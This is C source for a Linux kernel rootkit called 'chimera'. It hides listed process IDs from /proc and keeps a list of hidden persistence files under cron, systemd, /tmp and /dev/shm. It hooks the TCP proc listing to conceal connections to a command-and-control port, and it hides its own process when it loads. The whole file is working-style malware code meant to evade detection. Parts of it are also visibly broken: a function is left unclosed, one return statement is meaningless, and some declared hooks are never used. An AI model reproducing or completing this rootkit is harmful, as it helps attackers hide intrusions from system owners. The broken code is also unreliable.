#include "chimera.h"

#define MAX_HIDDEN 256

static pid_t hidden_pids[MAX_HIDDEN];
static int   hidden_count = 0;
static DEFINE_SPINLOCK(hide_lock);

static struct proc_ops saved_root_ops;
static struct file_operations saved_root_fops;
static int (*orig_iterate_shared)(struct file *, struct dir_context *);

int (*orig_tcp4_seq_show)(struct seq_file *, void *) = NULL;

static struct seq_operations *tcp4_seq_ops_ptr = NULL;


static bool is_hidden_pid(pid_t pid)
{
    bool found = false;
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    for (int i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) {
            found = true;
            break;
        }
    }
    spin_unlock_irqrestore(&hide_lock, flags);
    return found;
}

static int fake_filldir(struct dir_context *ctx, const char *name,
                        int namlen, loff_t offset, u64 ino,
                        unsigned int d_type)
{
    pid_t pid;
    int ret;

    if (namlen > 0 && name[0] >= '0' && name[0] <= '9') {
        ret = kstrtoint(name, 10, &pid);
        if (ret == 0 && is_hidden_pid(pid))
            return 0;
    }

    if (namlen == 12 && memcmp(name, "chimera_pid", 12) == 0)
        return 0;

    return orig_iterate_shared ?
           0 : 0;

struct proc_dir_entry *proc_root_entry = NULL;

static struct dir_context fake_ctx = {
    .actor = fake_filldir,
};

static asmlinkage long (*orig_filp_open)(const char *, int, umode_t);

static const char *hidden_files[] = {
    "/var/spool/cron/crontabs/.chimera",
    "/etc/systemd/system/chimera.service",
    "/tmp/.chimera_socket",
    "/dev/shm/.chimera",
    NULL
};

bool is_hidden_file(const char *path)
{
    for (int i = 0; hidden_files[i]; i++) {
        if (strstr(path, hidden_files[i]))
            return true;
    }
    return false;
}

static int fake_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = (struct sock *)v;

    if (sk && sk_fullsock(sk)) {
        struct inet_sock *inet = inet_sk(sk);
        __be16 dest = inet->inet_dport;

        if (ntohs(dest) == C2_PORT)
            return 0;
    }

    return orig_tcp4_seq_show(seq, v);
}

static int hook_tcp4_seq(void)
{
    struct proc_dir_entry *pde;
    void **show_ptr;

    pde = PDE(proc_net_tcp);
    if (!pde)
        return -ENOENT;

    tcp4_seq_ops_ptr = (struct seq_operations *)pde->data;
    if (!tcp4_seq_ops_ptr || !tcp4_seq_ops_ptr->show)
        return -ENOENT;

    orig_tcp4_seq_show = tcp4_seq_ops_ptr->show;

    tcp4_seq_ops_ptr->show = fake_tcp4_seq_show;

    return 0;
}

static void unhook_tcp4_seq(void)
{
    if (tcp4_seq_ops_ptr && orig_tcp4_seq_show)
        tcp4_seq_ops_ptr->show = orig_tcp4_seq_show;
}

int rk_hide_pid(pid_t pid)
{
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    if (hidden_count >= MAX_HIDDEN) {
        spin_unlock_irqrestore(&hide_lock, flags);
        return -ENOMEM;
    }
    hidden_pids[hidden_count++] = pid;
    spin_unlock_irqrestore(&hide_lock, flags);

    g_state.hide_pid = pid;
    return 0;
}

void rk_unhide_pid(pid_t pid)
{
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    for (int i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid) {
            hidden_pids[i] = hidden_pids[--hidden_count];
            break;
        }
    }
    spin_unlock_irqrestore(&hide_lock, flags);
}

int rk_init_hooks(void)
{
    int ret;
    rk_hide_pid(current->pid);
    ret = hook_tcp4_seq();
    if (ret)
        pr_warn("chimera: tcp4 hook failed (%d), network visible\n", ret);

    return 0;
}

void rk_cleanup_hooks(void)
{
    unhook_tcp4_seq();
    hidden_count = 0;
}
